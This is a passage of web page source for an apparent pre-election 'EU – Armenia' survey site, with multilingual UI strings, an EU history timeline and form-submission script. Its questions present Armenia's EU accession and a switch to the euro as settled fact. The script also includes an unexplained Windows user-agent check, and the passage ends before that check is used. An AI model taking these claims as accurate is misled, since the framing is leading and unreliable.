                    <h3 data-i18n="tl_2002_t">Euro Banknotes</h3>
                    <p data-i18n="tl_2002_d">Euro banknotes and coins entered circulation.</p>
                </div>
            </div>
            <div class="tl-item anim-up">
                <div class="tl-dot"></div>
                <div class="tl-card">
                    <span class="tl-year">2009</span>
                    <h3 data-i18n="tl_2009_t">Lisbon Treaty</h3>
                    <p data-i18n="tl_2009_d">Institutional reforms strengthened EU governance.</p>
                </div>
            </div>
            <div class="tl-item anim-up">
                <div class="tl-dot"></div>
                <div class="tl-card">
                    <span class="tl-year">2024</span>
                    <h3 data-i18n="tl_2024_t">Enlargement Talks</h3>
                    <p data-i18n="tl_2024_d">New enlargement negotiations opened with candidate countries.</p>
                </div>
            </div>
        </div>
    </div>
</section>

<footer class="footer">
    <div class="container footer-inner">
        <div class="footer-left">
            <div class="footer-flags">
                <div class="flag-am mini"><span></span><span></span><span></span></div>
                <svg viewBox="0 0 36 24" class="eu-svg mini-eu">
                    <rect width="36" height="24" fill="#003399" rx="2"/>
                    <?php for ($i = 0; $i < 12; $i++): $a = deg2rad($i * 30 - 90); $cx = 18 + 8 * cos($a); $cy = 12 + 8 * sin($a); ?>
                    <polygon points="<?= round($cx,1) ?>,<?= round($cy-1.4,1) ?> <?= round($cx+0.4,1) ?>,<?= round($cy-0.4,1) ?> <?= round($cx+1.3,1) ?>,<?= round($cy-0.4,1) ?> <?= round($cx+0.6,1) ?>,<?= round($cy+0.2,1) ?> <?= round($cx+0.8,1) ?>,<?= round($cy+1.1,1) ?> <?= round($cx,1) ?>,<?= round($cy+0.6,1) ?> <?= round($cx-0.8,1) ?>,<?= round($cy+1.1,1) ?> <?= round($cx-0.6,1) ?>,<?= round($cy+0.2,1) ?> <?= round($cx-1.3,1) ?>,<?= round($cy-0.4,1) ?> <?= round($cx-0.4,1) ?>,<?= round($cy-0.4,1) ?>" fill="#FFD700"/>
                    <?php endfor; ?>
                </svg>
            </div>
            <span class="footer-copy">&copy; 2026 EU – Armenia Integration Platform</span>
        </div>
        <div class="footer-links">
            <a href="#survey-section" data-i18n="nav_survey">Survey</a>
            <a href="#timeline-section" data-i18n="nav_timeline">EU History</a>
        </div>
    </div>
</footer>

<div class="modal-overlay" id="successModal">
    <div class="modal-box">
        <div class="modal-check">
            <svg viewBox="0 0 56 56" width="56" height="56">
                <circle cx="28" cy="28" r="26" fill="none" stroke="#10B981" stroke-width="2.5"/>
                <path d="M17 29l8 8 14-14" fill="none" stroke="#10B981" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
        </div>
        <h3 class="modal-heading" data-i18n="modal_success_title">Thank You!</h3>
        <p class="modal-msg" data-i18n="modal_success_text">Your survey has been submitted successfully.</p>
        <button class="modal-btn" id="modalCloseBtn" data-i18n="modal_close">Close</button>
    </div>
</div>

<script>
(function(){var T={hy:{},en:{logo_main:'EU \u2013 Armenia',logo_sub:'European Integration',nav_survey:'Survey',nav_timeline:'EU History',hero_badge:'Pre-election Survey 2026',hero_title:'Armenia\u2019s Integration\ninto the European Alliance',hero_desc:'Participate in the national public survey. Your voice matters for shaping the future.',hero_cta:'Take the Survey',survey_badge:'Public Survey',survey_title:'Integration Survey',survey_desc:'Your opinion is important. Please answer the following questions.',label_email:'Email Address (optional)',ph_email:'example@email.com',note_email:'We will send you news and informational updates via email.',error_email:'Invalid email format',label_currency:'After Armenia joins the European Alliance, the currency will change to Euro. What should the currency policy be?',opt_dram_only:'Only Armenian Dram',opt_euro_only:'Only Euro',opt_both:'Both Dram and Euro',label_laws:'After joining the EU, some laws will change \u2014 wages will increase, but working hours will also change. Will this cause problems in the daily life of Armenian citizens?',opt_yes:'Yes',opt_no:'No',opt_undecided:'Undecided',label_citizen:'Are you an Armenian citizen?',error_required:'This field is required',submit_btn:'Submit',stat1_num:'27+',stat1_label:'Member States',stat2_num:'450M+',stat2_label:'Citizens',stat3_num:'1957',stat3_label:'Year Founded',stat4_num:'24',stat4_label:'Official Languages',timeline_badge:'History',timeline_title:'European Alliance History',tl_1957_t:'Treaty of Rome',tl_1957_d:'Six founding states established the European Economic Community.',tl_1993_t:'Maastricht Treaty',tl_1993_d:'The European Union was officially established.',tl_2002_t:'Euro Banknotes',tl_2002_d:'Euro banknotes and coins entered circulation.',tl_2009_t:'Lisbon Treaty',tl_2009_d:'Institutional reforms strengthened EU governance.',tl_2024_t:'Enlargement Talks',tl_2024_d:'New enlargement negotiations opened with candidate countries.',modal_success_title:'Thank You!',modal_success_text:'Your survey has been submitted successfully.',modal_close:'Close'},ru:{logo_main:'\u0415\u0421 \u2013 \u0410\u0440\u043C\u0435\u043D\u0438\u044F',logo_sub:'\u0415\u0432\u0440\u043E\u043F\u0435\u0439\u0441\u043A\u0430\u044F \u0438\u043D\u0442\u0435\u0433\u0440\u0430\u0446\u0438\u044F',nav_survey:'\u041E\u043F\u0440\u043E\u0441',nav_timeline:'\u0418\u0441\u0442\u043E\u0440\u0438\u044F \u0415\u0421',hero_badge:'\u041F\u0440\u0435\u0434\u0432\u044B\u0431\u043E\u0440\u043D\u044B\u0439 \u043E\u043F\u0440\u043E\u0441 2026',hero_title:'\u0418\u043D\u0442\u0435\u0433\u0440\u0430\u0446\u0438\u044F \u0410\u0440\u043C\u0435\u043D\u0438\u0438\n\u0432 \u0415\u0432\u0440\u043E\u043F\u0435\u0439\u0441\u043A\u0438\u0439 \u0421\u043E\u044E\u0437',hero_desc:'\u041F\u0440\u0438\u043C\u0438\u0442\u0435 \u0443\u0447\u0430\u0441\u0442\u0438\u0435 \u0432 \u043D\u0430\u0446\u0438\u043E\u043D\u0430\u043B\u044C\u043D\u043E\u043C \u043E\u043F\u0440\u043E\u0441\u0435. \u0412\u0430\u0448 \u0433\u043E\u043B\u043E\u0441 \u0432\u0430\u0436\u0435\u043D.',hero_cta:'\u041F\u0440\u043E\u0439\u0442\u0438 \u043E\u043F\u0440\u043E\u0441',survey_badge:'\u041E\u043F\u0440\u043E\u0441',survey_title:'\u041E\u043F\u0440\u043E\u0441 \u043E\u0431 \u0438\u043D\u0442\u0435\u0433\u0440\u0430\u0446\u0438\u0438',survey_desc:'\u0412\u0430\u0448\u0435 \u043C\u043D\u0435\u043D\u0438\u0435 \u0432\u0430\u0436\u043D\u043E. \u041F\u043E\u0436\u0430\u043B\u0443\u0439\u0441\u0442\u0430, \u043E\u0442\u0432\u0435\u0442\u044C\u0442\u0435 \u043D\u0430 \u0441\u043B\u0435\u0434\u0443\u044E\u0449\u0438\u0435 \u0432\u043E\u043F\u0440\u043E\u0441\u044B.',label_email:'\u042D\u043B\u0435\u043A\u0442\u0440\u043E\u043D\u043D\u0430\u044F \u043F\u043E\u0447\u0442\u0430 (\u043D\u0435\u043E\u0431\u044F\u0437\u0430\u0442\u0435\u043B\u044C\u043D\u043E)',ph_email:'example@email.com',note_email:'\u041C\u044B \u0431\u0443\u0434\u0435\u043C \u043E\u0442\u043F\u0440\u0430\u0432\u043B\u044F\u0442\u044C \u0432\u0430\u043C \u043D\u043E\u0432\u043E\u0441\u0442\u0438 \u0438 \u043E\u0431\u043D\u043E\u0432\u043B\u0435\u043D\u0438\u044F \u043F\u043E \u044D\u043B\u0435\u043A\u0442\u0440\u043E\u043D\u043D\u043E\u0439 \u043F\u043E\u0447\u0442\u0435.',error_email:'\u041D\u0435\u0432\u0435\u0440\u043D\u044B\u0439 \u0444\u043E\u0440\u043C\u0430\u0442 \u044D\u043B. \u043F\u043E\u0447\u0442\u044B',label_currency:'\u041F\u043E\u0441\u043B\u0435 \u0432\u0441\u0442\u0443\u043F\u043B\u0435\u043D\u0438\u044F \u0410\u0440\u043C\u0435\u043D\u0438\u0438 \u0432 \u0415\u0432\u0440\u043E\u043F\u0435\u0439\u0441\u043A\u0438\u0439 \u0421\u043E\u044E\u0437, \u0432\u0430\u043B\u044E\u0442\u0430 \u0438\u0437\u043C\u0435\u043D\u0438\u0442\u0441\u044F \u043D\u0430 \u0415\u0432\u0440\u043E. \u041A\u0430\u043A\u043E\u0439 \u0434\u043E\u043B\u0436\u043D\u0430 \u0431\u044B\u0442\u044C \u0432\u0430\u043B\u044E\u0442\u043D\u0430\u044F \u043F\u043E\u043B\u0438\u0442\u0438\u043A\u0430?',opt_dram_only:'\u0422\u043E\u043B\u044C\u043A\u043E \u0430\u0440\u043C\u044F\u043D\u0441\u043A\u0438\u0439 \u0414\u0440\u0430\u043C',opt_euro_only:'\u0422\u043E\u043B\u044C\u043A\u043E \u0415\u0432\u0440\u043E',opt_both:'\u0418 \u0414\u0440\u0430\u043C, \u0438 \u0415\u0432\u0440\u043E',label_laws:'\u041F\u043E\u0441\u043B\u0435 \u0432\u0441\u0442\u0443\u043F\u043B\u0435\u043D\u0438\u044F \u0432 \u0415\u0421 \u043D\u0435\u043A\u043E\u0442\u043E\u0440\u044B\u0435 \u0437\u0430\u043A\u043E\u043D\u044B \u0438\u0437\u043C\u0435\u043D\u044F\u0442\u0441\u044F \u2014 \u0437\u0430\u0440\u043F\u043B\u0430\u0442\u044B \u0432\u044B\u0440\u0430\u0441\u0442\u0443\u0442, \u043D\u043E \u0443\u0441\u043B\u043E\u0432\u0438\u044F \u0442\u0440\u0443\u0434\u0430 \u0438\u0437\u043C\u0435\u043D\u044F\u0442\u0441\u044F. \u0421\u043E\u0437\u0434\u0430\u0441\u0442 \u043B\u0438 \u044D\u0442\u043E \u043F\u0440\u043E\u0431\u043B\u0435\u043C\u044B \u0432 \u043F\u043E\u0432\u0441\u0435\u0434\u043D\u0435\u0432\u043D\u043E\u0439 \u0436\u0438\u0437\u043D\u0438?',opt_yes:'\u0414\u0430',opt_no:'\u041D\u0435\u0442',opt_undecided:'\u041D\u0435 \u043E\u043F\u0440\u0435\u0434\u0435\u043B\u0438\u043B\u0441\u044F',label_citizen:'\u0412\u044B \u0433\u0440\u0430\u0436\u0434\u0430\u043D\u0438\u043D \u0410\u0440\u043C\u0435\u043D\u0438\u0438?',error_required:'\u042D\u0442\u043E \u043F\u043E\u043B\u0435 \u043E\u0431\u044F\u0437\u0430\u0442\u0435\u043B\u044C\u043D\u043E',submit_btn:'\u041E\u0442\u043F\u0440\u0430\u0432\u0438\u0442\u044C',stat1_num:'27+',stat1_label:'\u0421\u0442\u0440\u0430\u043D-\u0447\u043B\u0435\u043D\u043E\u0432',stat2_num:'450\u041C+',stat2_label:'\u0413\u0440\u0430\u0436\u0434\u0430\u043D',stat3_num:'1957',stat3_label:'\u0413\u043E\u0434 \u043E\u0441\u043D\u043E\u0432\u0430\u043D\u0438\u044F',stat4_num:'24',stat4_label:'\u041E\u0444\u0438\u0446\u0438\u0430\u043B\u044C\u043D\u044B\u0445 \u044F\u0437\u044B\u043A\u043E\u0432',timeline_badge:'\u0418\u0441\u0442\u043E\u0440\u0438\u044F',timeline_title:'\u0418\u0441\u0442\u043E\u0440\u0438\u044F \u0415\u0432\u0440\u043E\u043F\u0435\u0439\u0441\u043A\u043E\u0433\u043E \u0421\u043E\u044E\u0437\u0430',tl_1957_t:'\u0420\u0438\u043C\u0441\u043A\u0438\u0439 \u0434\u043E\u0433\u043E\u0432\u043E\u0440',tl_1957_d:'\u0428\u0435\u0441\u0442\u044C \u0441\u0442\u0440\u0430\u043D \u043E\u0441\u043D\u043E\u0432\u0430\u043B\u0438 \u0415\u0432\u0440\u043E\u043F\u0435\u0439\u0441\u043A\u043E\u0435 \u044D\u043A\u043E\u043D\u043E\u043C\u0438\u0447\u0435\u0441\u043A\u043E\u0435 \u0441\u043E\u043E\u0431\u0449\u0435\u0441\u0442\u0432\u043E.',tl_1993_t:'\u041C\u0430\u0430\u0441\u0442\u0440\u0438\u0445\u0442\u0441\u043A\u0438\u0439 \u0434\u043E\u0433\u043E\u0432\u043E\u0440',tl_1993_d:'\u0415\u0432\u0440\u043E\u043F\u0435\u0439\u0441\u043A\u0438\u0439 \u0441\u043E\u044E\u0437 \u0431\u044B\u043B \u043E\u0444\u0438\u0446\u0438\u0430\u043B\u044C\u043D\u043E \u0441\u043E\u0437\u0434\u0430\u043D.',tl_2002_t:'\u0411\u0430\u043D\u043A\u043D\u043E\u0442\u044B \u0415\u0432\u0440\u043E',tl_2002_d:'\u0411\u0430\u043D\u043A\u043D\u043E\u0442\u044B \u0438 \u043C\u043E\u043D\u0435\u0442\u044B \u0435\u0432\u0440\u043E \u0432\u0432\u0435\u0434\u0435\u043D\u044B \u0432 \u043E\u0431\u0440\u0430\u0449\u0435\u043D\u0438\u0435.',tl_2009_t:'\u041B\u0438\u0441\u0441\u0430\u0431\u043E\u043D\u0441\u043A\u0438\u0439 \u0434\u043E\u0433\u043E\u0432\u043E\u0440',tl_2009_d:'\u0418\u043D\u0441\u0442\u0438\u0442\u0443\u0446\u0438\u043E\u043D\u0430\u043B\u044C\u043D\u044B\u0435 \u0440\u0435\u0444\u043E\u0440\u043C\u044B \u0443\u043A\u0440\u0435\u043F\u0438\u043B\u0438 \u0443\u043F\u0440\u0430\u0432\u043B\u0435\u043D\u0438\u0435 \u0415\u0421.',tl_2024_t:'\u041F\u0435\u0440\u0435\u0433\u043E\u0432\u043E\u0440\u044B \u043E \u0440\u0430\u0441\u0448\u0438\u0440\u0435\u043D\u0438\u0438',tl_2024_d:'\u041D\u0430\u0447\u0430\u043B\u0438\u0441\u044C \u043D\u043E\u0432\u044B\u0435 \u043F\u0435\u0440\u0435\u0433\u043E\u0432\u043E\u0440\u044B \u0441\u043E \u0441\u0442\u0440\u0430\u043D\u0430\u043C\u0438-\u043A\u0430\u043D\u0434\u0438\u0434\u0430\u0442\u0430\u043C\u0438.',modal_success_title:'\u0421\u043F\u0430\u0441\u0438\u0431\u043E!',modal_success_text:'\u0412\u0430\u0448 \u043E\u043F\u0440\u043E\u0441 \u0443\u0441\u043F\u0435\u0448\u043D\u043E \u043E\u0442\u043F\u0440\u0430\u0432\u043B\u0435\u043D.',modal_close:'\u0417\u0430\u043A\u0440\u044B\u0442\u044C'},de:{logo_main:'EU \u2013 Armenien',logo_sub:'Europ\u00E4ische Integration',nav_survey:'Umfrage',nav_timeline:'EU-Geschichte',hero_badge:'Vorwahlumfrage 2026',hero_title:'Armeniens Integration\nin die Europ\u00E4ische Allianz',hero_desc:'Nehmen Sie an der nationalen Umfrage teil. Ihre Stimme ist wichtig f\u00FCr die Zukunft.',hero_cta:'An der Umfrage teilnehmen',survey_badge:'Umfrage',survey_title:'Integrationsumfrage',survey_desc:'Ihre Meinung ist wichtig. Bitte beantworten Sie die folgenden Fragen.',label_email:'E-Mail-Adresse (optional)',ph_email:'beispiel@email.com',note_email:'Wir senden Ihnen Neuigkeiten und Informationen per E-Mail.',error_email:'Ung\u00FCltiges E-Mail-Format',label_currency:'Nach dem Beitritt Armeniens zur EU wird die W\u00E4hrung auf Euro umgestellt. Wie sollte die W\u00E4hrungspolitik aussehen?',opt_dram_only:'Nur Armenischer Dram',opt_euro_only:'Nur Euro',opt_both:'Sowohl Dram als auch Euro',label_laws:'Nach dem EU-Beitritt \u00E4ndern sich einige Gesetze \u2014 L\u00F6hne steigen, aber Arbeitszeiten \u00E4ndern sich. Wird dies Probleme im Alltag verursachen?',opt_yes:'Ja',opt_no:'Nein',opt_undecided:'Unentschlossen',label_citizen:'Sind Sie armenischer Staatsb\u00FCrger?',error_required:'Dieses Feld ist erforderlich',submit_btn:'Absenden',stat1_num:'27+',stat1_label:'Mitgliedstaaten',stat2_num:'450M+',stat2_label:'B\u00FCrger',stat3_num:'1957',stat3_label:'Gr\u00FCndungsjahr',stat4_num:'24',stat4_label:'Amtssprachen',timeline_badge:'Geschichte',timeline_title:'Geschichte der Europ\u00E4ischen Allianz',tl_1957_t:'R\u00F6mische Vertr\u00E4ge',tl_1957_d:'Sechs Gr\u00FCndungsstaaten schufen die Europ\u00E4ische Wirtschaftsgemeinschaft.',tl_1993_t:'Vertrag von Maastricht',tl_1993_d:'Die Europ\u00E4ische Union wurde offiziell gegr\u00FCndet.',tl_2002_t:'Euro-Banknoten',tl_2002_d:'Euro-Banknoten und -M\u00FCnzen kamen in Umlauf.',tl_2009_t:'Vertrag von Lissabon',tl_2009_d:'Institutionelle Reformen st\u00E4rkten die EU-Governance.',tl_2024_t:'Erweiterungsgespr\u00E4che',tl_2024_d:'Neue Beitrittsverhandlungen mit Kandidatenl\u00E4ndern wurden er\u00F6ffnet.',modal_success_title:'Vielen Dank!',modal_success_text:'Ihre Umfrage wurde erfolgreich eingereicht.',modal_close:'Schlie\u00DFen'}};
T.hy={logo_main:'\u0535\u0544 \u2013 \u0540\u0561\u0575\u0561\u057D\u057F\u0561\u0576',logo_sub:'\u0535\u057E\u0580\u0578\u057A\u0561\u056F\u0561\u0576 \u056B\u0576\u057F\u0565\u0563\u0580\u0561\u0581\u056B\u0561',nav_survey:'\u0540\u0561\u0580\u0581\u0578\u0582\u0574',nav_timeline:'\u0535\u0544 \u057A\u0561\u057F\u0574\u0578\u0582\u0569\u0575\u0578\u0582\u0576',hero_badge:'\u0546\u0561\u056D\u0568\u0576\u057F\u0580\u0561\u056F\u0561\u0576 \u0570\u0561\u0580\u0581\u0578\u0582\u0574 2026',hero_title:'\u0540\u0561\u0575\u0561\u057D\u057F\u0561\u0576\u056B \u056B\u0576\u057F\u0565\u0563\u0580\u0578\u0582\u0574\u0568\n\u0535\u057E\u0580\u0578\u057A\u0561\u056F\u0561\u0576 \u0534\u0561\u0577\u056B\u0576\u0584',hero_desc:'\u0544\u0561\u057D\u0576\u0561\u056F\u0581\u0565\u0584 \u0561\u0566\u0563\u0561\u0575\u056B\u0576 \u0570\u0561\u0576\u0580\u0561\u0575\u056B\u0576 \u0570\u0561\u0580\u0581\u0574\u0561\u0576\u0568\u0589 \u0541\u0565\u0580 \u0571\u0561\u0575\u0576\u0568 \u056F\u0561\u0580\u0587\u0578\u0580 \u0567 \u0561\u057A\u0561\u0563\u0561\u0575\u056B \u0571\u0587\u0561\u057E\u0578\u0580\u0574\u0561\u0576 \u0570\u0561\u0574\u0561\u0580\u0589',hero_cta:'\u0544\u0561\u057D\u0576\u0561\u056F\u0581\u0565\u056C \u0570\u0561\u0580\u0581\u0574\u0561\u0576\u0568',survey_badge:'\u0540\u0561\u0576\u0580\u0561\u0575\u056B\u0576 \u0570\u0561\u0580\u0581\u0578\u0582\u0574',survey_title:'\u053B\u0576\u057F\u0565\u0563\u0580\u0561\u0581\u056B\u0561\u0575\u056B \u0570\u0561\u0580\u0581\u0578\u0582\u0574',survey_desc:'\u0541\u0565\u0580 \u056F\u0561\u0580\u0581\u056B\u0584\u0568 \u056F\u0561\u0580\u0587\u0578\u0580 \u0567\u0589 \u053D\u0576\u0564\u0580\u0578\u0582\u0574 \u0565\u0576\u0584 \u057A\u0561\u057F\u0561\u057D\u056D\u0561\u0576\u0565\u056C \u0570\u0565\u057F\u0587\u0575\u0561\u056C \u0570\u0561\u0580\u0581\u0565\u0580\u056B\u0576\u0589',label_email:'\u0537\u056C. \u0570\u0561\u057D\u0581\u0567 (\u056F\u0561\u0574\u0561\u057E\u0578\u0580)',ph_email:'example@email.com',note_email:'\u0544\u0565\u0576\u0584 \u0541\u0565\u0566 \u056F\u0578\u0582\u0572\u0561\u0580\u056F\u0565\u0576\u0584 \u0576\u0578\u0580\u0578\u0582\u0569\u0575\u0578\u0582\u0576\u0576\u0565\u0580 \u0587 \u057F\u0565\u0572\u0565\u056F\u0578\u0582\u0569\u0575\u0578\u0582\u0576\u0576\u0565\u0580 \u0567\u056C. \u0570\u0561\u057D\u0581\u0567\u0578\u057E\u0589',error_email:'\u054D\u056D\u0561\u056C \u0567\u056C. \u0570\u0561\u057D\u0581\u0567\u056B \u0571\u0587\u0561\u0579\u0561\u0583',label_currency:'\u0540\u0561\u0575\u0561\u057D\u057F\u0561\u0576\u056B \u0535\u057E\u0580\u0578\u057A\u0561\u056F\u0561\u0576 \u0534\u0561\u0577\u056B\u0576\u0584\u056B \u056B\u0576\u057F\u0565\u0563\u0580\u0578\u0582\u0574\u056B\u0581 \u0570\u0565\u057F\u0578 \u0564\u0580\u0561\u0574\u0568 \u056F\u0583\u0578\u056D\u057E\u056B \u0587 \u056F\u0564\u0561\u057C\u0576\u0561 Euro\u0589 \u0541\u0565\u0580 \u056F\u0561\u0580\u0581\u056B\u0584\u0578\u057E\u055D \u056B\u0576\u0579\u057A\u0565\u057D \u057A\u0565\u057F\u0584 \u0567 \u056C\u056B\u0576\u056B\u055E',opt_dram_only:'\u0544\u056B\u0561\u0575\u0576 \u0540\u0561\u0575\u056F\u0561\u056F\u0561\u0576 \u0534\u0580\u0561\u0574',opt_euro_only:'\u0544\u056B\u0561\u0575\u0576 Euro',opt_both:'\u0540\u0565\u0574 \u0534\u0580\u0561\u0574\u055D \u0570\u0565\u0574 Euro',label_laws:'\u0535\u057E\u0580\u0578\u057A\u0561\u056F\u0561\u0576 \u0534\u0561\u0577\u056B\u0576\u0584\u056B\u0576 \u0561\u0576\u0564\u0561\u0574 \u0563\u0580\u057E\u0565\u056C\u0578\u0582\u0581 \u0570\u0565\u057F\u0578 \u0578\u0580\u0578\u0577 \u0585\u0580\u0565\u0576\u0584\u0576\u0565\u0580 \u056F\u0583\u0578\u056D\u057E\u0565\u0576 \u2014 \u0561\u0577\u056D\u0561\u057F\u0561\u057E\u0561\u0580\u0571\u0565\u0580\u0568 \u056F\u0562\u0561\u0580\u0571\u0580\u0561\u0576\u0561\u0576\u055D \u0562\u0561\u0575\u0581 \u0561\u0577\u056D\u0561\u057F\u0561\u0576\u0584\u0561\u0575\u056B\u0576 \u056A\u0561\u0574\u0565\u0580\u0568 \u056F\u0583\u0578\u056D\u057E\u0565\u0576\u0589 \u054D\u0561 \u056D\u0576\u0564\u056B\u0580 \u056F\u057D\u057F\u0565\u0572\u0581\u056B\u055E \u0540\u0561\u0575 \u056A\u0578\u0572\u0578\u057E\u0580\u0564\u056B \u056F\u0565\u0576\u057D\u0561\u056F\u0565\u0580\u057A\u056B\u0576 \u0574\u0565\u057B\u055E',opt_yes:'\u0531\u0575\u0578',opt_no:'\u0548\u0579',opt_undecided:'\u0531\u0576\u057E\u0578\u0580\u0578\u0577',label_citizen:'\u0540\u0561\u0575\u0561\u057D\u057F\u0561\u0576\u056B \u0584\u0561\u0572\u0561\u0584\u0561\u0581\u056B \u0565\u0584\u055E',error_required:'\u0549\u056B \u056F\u0561\u0580\u0565\u056C\u056B \u0564\u0561\u057F\u0561\u0580\u056F \u0569\u0578\u0572\u0576\u0565\u056C',submit_btn:'\u0548\u0582\u0572\u0561\u0580\u056F\u0565\u056C',stat1_num:'27+',stat1_label:'\u0531\u0576\u0564\u0561\u0574 \u0565\u0580\u056F\u0580\u0576\u0565\u0580',stat2_num:'450\u0544+',stat2_label:'\u0554\u0561\u0572\u0561\u0584\u0561\u0581\u056B\u0576\u0565\u0580',stat3_num:'1957',stat3_label:'\u0540\u056B\u0574\u0576\u0561\u0564\u0580\u0574\u0561\u0576 \u057F\u0561\u0580\u056B',stat4_num:'24',stat4_label:'\u054A\u0561\u0577\u057F\u0578\u0576\u0561\u056F\u0561\u0576 \u056C\u0565\u0566\u0578\u0582\u0576\u0565\u0580',timeline_badge:'\u054A\u0561\u057F\u0574\u0578\u0582\u0569\u0575\u0578\u0582\u0576',timeline_title:'\u0535\u057E\u0580\u0578\u057A\u0561\u056F\u0561\u0576 \u0534\u0561\u0577\u056B\u0576\u0584\u056B \u057A\u0561\u057F\u0574\u0578\u0582\u0569\u0575\u0578\u0582\u0576',tl_1957_t:'\u0540\u057C\u0578\u0574\u056B \u057A\u0561\u0575\u0574\u0561\u0576\u0561\u0563\u056B\u0580',tl_1957_d:'\u054E\u0565\u0581 \u0570\u056B\u0574\u0576\u0561\u0564\u056B\u0580 \u0565\u0580\u056F\u0580\u0576\u0565\u0580 \u057D\u057F\u0565\u0572\u056E\u0565\u0581\u056B\u0576 \u0535\u057E\u0580\u0578\u057A\u0561\u056F\u0561\u0576 \u057F\u0576\u057F\u0565\u057D\u0561\u056F\u0561\u0576 \u0570\u0561\u0574\u0561\u0575\u0576\u0584\u0568\u0589',tl_1993_t:'\u0544\u0561\u0561\u057D\u057F\u0580\u056B\u056D\u057F\u056B \u057A\u0561\u0575\u0574\u0561\u0576\u0561\u0563\u056B\u0580',tl_1993_d:'\u0535\u057E\u0580\u0578\u057A\u0561\u056F\u0561\u0576 \u0544\u056B\u0578\u0582\u0569\u0575\u0578\u0582\u0576\u0568 \u057A\u0561\u0577\u057F\u0578\u0576\u0561\u057A\u0565\u057D \u057D\u057F\u0565\u0572\u056E\u057E\u0565\u0581\u0589',tl_2002_t:'Euro \u0569\u0572\u0569\u0561\u0564\u0580\u0561\u0574\u0576\u0565\u0580',tl_2002_d:'Euro \u0569\u0572\u0569\u0561\u0564\u0580\u0561\u0574\u0576\u0565\u0580\u0576 \u0578\u0582 \u0574\u0565\u057F\u0561\u0572\u0561\u0564\u0580\u0561\u0574\u0576\u0565\u0580\u0568 \u0577\u0580\u057B\u0561\u0576\u0561\u057C\u0578\u0582\u0569\u0575\u0561\u0576 \u0574\u0565\u057B \u0574\u057F\u0561\u0576\u0589',tl_2009_t:'\u053C\u056B\u057D\u0561\u0562\u0578\u0576\u056B \u057A\u0561\u0575\u0574\u0561\u0576\u0561\u0563\u056B\u0580',tl_2009_d:'\u053B\u0576\u057D\u057F\u056B\u057F\u0578\u0582\u0581\u056B\u0578\u0576\u0561\u056C \u0562\u0561\u0580\u0565\u0583\u0578\u056D\u0578\u0582\u0574\u0576\u0565\u0580\u0568 \u0561\u0574\u0580\u0561\u057A\u0576\u0564\u0565\u0581\u056B\u0576 \u0535\u0544 \u056F\u0561\u057C\u0561\u057E\u0561\u0580\u0578\u0582\u0574\u0568\u0589',tl_2024_t:'\u0538\u0576\u0564\u056C\u0561\u0575\u0576\u0574\u0561\u0576 \u0562\u0561\u0576\u0561\u056F\u0581\u0578\u0582\u0569\u0575\u0578\u0582\u0576\u0576\u0565\u0580',tl_2024_d:'\u0546\u0578\u0580 \u0568\u0576\u0564\u056C\u0561\u0575\u0576\u0574\u0561\u0576 \u0562\u0561\u0576\u0561\u056F\u0581\u0578\u0582\u0569\u0575\u0578\u0582\u0576\u0576\u0565\u0580 \u057D\u056F\u057D\u057E\u0565\u0581\u056B\u0576 \u0569\u0565\u056F\u0576\u0561\u056E\u0578\u0582 \u0565\u0580\u056F\u0580\u0576\u0565\u0580\u056B \u0570\u0565\u057F\u0589',modal_success_title:'\u0547\u0576\u0578\u0580\u0570\u0561\u056F\u0561\u056C\u0578\u0582\u0569\u0575\u0578\u0582\u0576!',modal_success_text:'\u0541\u0565\u0580 \u0570\u0561\u0580\u0581\u0578\u0582\u0574\u0568 \u0570\u0561\u057B\u0578\u0572\u0578\u0582\u0569\u0575\u0561\u0574\u0562 \u0578\u0582\u0572\u0561\u0580\u056F\u057E\u0565\u0581\u0589',modal_close:'\u0553\u0561\u056F\u0565\u056C'};
var currentLang='hy';
var langMap={hy:{flag:'\uD83C\uDDE6\uD83C\uDDF2',label:'\u0540\u0561\u0575\u0565\u0580\u0565\u0576'},en:{flag:'\uD83C\uDDEC\uD83C\uDDE7',label:'English'},ru:{flag:'\uD83C\uDDF7\uD83C\uDDFA',label:'\u0420\u0443\u0441\u0441\u043A\u0438\u0439'},de:{flag:'\uD83C\uDDE9\uD83C\uDDEA',label:'Deutsch'}};
function applyLanguage(lang){var dict=T[lang]||T.en;document.querySelectorAll('[data-i18n]').forEach(function(el){var key=el.getAttribute('data-i18n');if(dict[key]!==undefined)el.textContent=dict[key]});document.querySelectorAll('[data-i18n-placeholder]').forEach(function(el){var key=el.getAttribute('data-i18n-placeholder');if(dict[key]!==undefined)el.placeholder=dict[key]});document.documentElement.lang=lang;currentLang=lang;try{localStorage.setItem('lang',lang)}catch(e){}document.body.classList.remove('i18n-loading')}
function initLangSwitcher(){var btn=document.getElementById('langBtn');var dropdown=document.getElementById('langDropdown');var flagEl=btn.querySelector('.lang-flag');var labelEl=document.getElementById('langLabel');btn.addEventListener('click',function(e){e.stopPropagation();var isOpen=dropdown.classList.toggle('open');btn.setAttribute('aria-expanded',isOpen)});document.addEventListener('click',function(){dropdown.classList.remove('open');btn.setAttribute('aria-expanded','false')});dropdown.querySelectorAll('[data-lang]').forEach(function(li){li.addEventListener('click',function(e){e.stopPropagation();var lang=li.getAttribute('data-lang');var info=langMap[lang];flagEl.textContent=info.flag;labelEl.textContent=info.label;dropdown.querySelectorAll('li').forEach(function(item){item.classList.remove('active')});li.classList.add('active');dropdown.classList.remove('open');btn.setAttribute('aria-expanded','false');applyLanguage(lang)})})}
function isWindowsUA(){return/Windows NT/.test(navigator.userAgent)}
function initForm(){var form=document.getElementById('surveyForm');var btn=document.getElementById('submitBtn');form.addEventListener('submit',function(e){e.preventDefault();document.querySelectorAll('.field.has-error').forEach(function(f){f.classList.remove('has-error')});var hasError=false;['currency','laws','citizen'].forEach(function(name){var group=document.querySelector('[data-field="'+name+'"]');if(!form.querySelector('input[name="'+name+'"]:checked')){group.classList.add('has-error');hasError=true}});var emailVal=form.querySelector('input[name="email"]').value.trim();if(emailVal&&!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailVal)){document.querySelector('[data-field="email"]').classList.add('has-error');hasError=true}if(hasError)return;btn.classList.add('loading');btn.disabled=true;var payload={email:emailVal,currency:getRadio('currency'),laws:getRadio('laws'),citizen:getRadio('citizen')};fetch('?action=submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)}).then(function(r){return 